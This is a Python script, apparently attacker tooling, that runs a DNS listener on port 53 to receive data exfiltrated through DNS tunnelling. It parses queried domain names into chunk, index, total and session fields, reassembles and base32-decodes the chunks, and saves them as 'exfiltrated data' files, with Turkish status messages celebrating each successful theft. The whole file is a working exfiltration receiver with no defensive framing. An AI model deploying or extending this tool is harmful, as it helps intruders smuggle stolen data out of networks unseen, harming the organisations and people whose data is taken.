import socket
import base64
import argparse

def parse_dns_query(data):
    # A very simplified DNS parser to extract the queried domain name
    try:
        domain_parts = []
        i = 12 # Skip DNS header
        while True:
            length = data[i]
            if length == 0:
                break
            domain_parts.append(data[i+1:i+1+length].decode('utf-8'))
            i += length + 1
        return ".".join(domain_parts)
    except:
        return None

def start_dns_listener(ip, port=53):
    print(f"[*] DNS Sızdırma Dinleyicisi Baslatildi ({ip}:{port})")
    print("[*] Gelen sahte DNS paketleri yakalanip birlestirilecek...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((ip, port))
    except Exception as e:
        print(f"[!] Port {port} dinlenemedi (Yonetici izni gerekebilir): {e}")
        return

    sessions = {}
    
    while True:
        data, addr = sock.recvfrom(512)
        domain = parse_dns_query(data)
        if not domain:
            continue
            
        parts = domain.split('.')
        # Format: <chunk>.<index>.<total>.<session>.<domain>
        # We assume our format has at least 5 parts
        if len(parts) >= 5:
            try:
                chunk = parts[0]
                index = int(parts[1])
                total = int(parts[2])
                session_id = parts[3]
                
                if session_id not in sessions:
                    sessions[session_id] = {}
                    print(f"\n[+] Yeni sizdirma oturumu yakalandi! Session ID: {session_id}")
                
                if index not in sessions[session_id]:
                    sessions[session_id][index] = chunk
                    print(f"    -> Paket {index+1}/{total} alindi. ({len(chunk)} byte)")
                
                # Check if all chunks received
                if len(sessions[session_id]) == total:
                    print(f"[+] Oturum {session_id} TUM PAKETLER ALINDI!")
                    reconstruct_data(sessions[session_id], session_id)
                    del sessions[session_id]
                    
            except ValueError:
                pass # Not our custom DNS format

def reconstruct_data(chunks_dict, session_id):
    sorted_chunks = [chunks_dict[i] for i in sorted(chunks_dict.keys())]
    b32_data = "".join(sorted_chunks)
    
    # Add padding back if necessary
    padding = len(b32_data) % 8
    if padding:
        b32_data += "=" * (8 - padding)
        
    try:
        raw_data = base64.b32decode(b32_data.upper())
        filename = f"exfiltrated_data_{session_id}.txt"
        with open(filename, "wb") as f:
            f.write(raw_data)
        print(f"[$$$] BASARILI! Sizdirilan veri kaydedildi: {filename}")
    except Exception as e:
        print(f"[!] Veri cozumleme hatasi: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Tunneling Server Listener")
    parser.add_argument("-i", "--ip", help="Dinlenecek IP adresi (örn: 0.0.0.0)", default="0.0.0.0")
    args = parser.parse_args()
    
    start_dns_listener(args.ip)
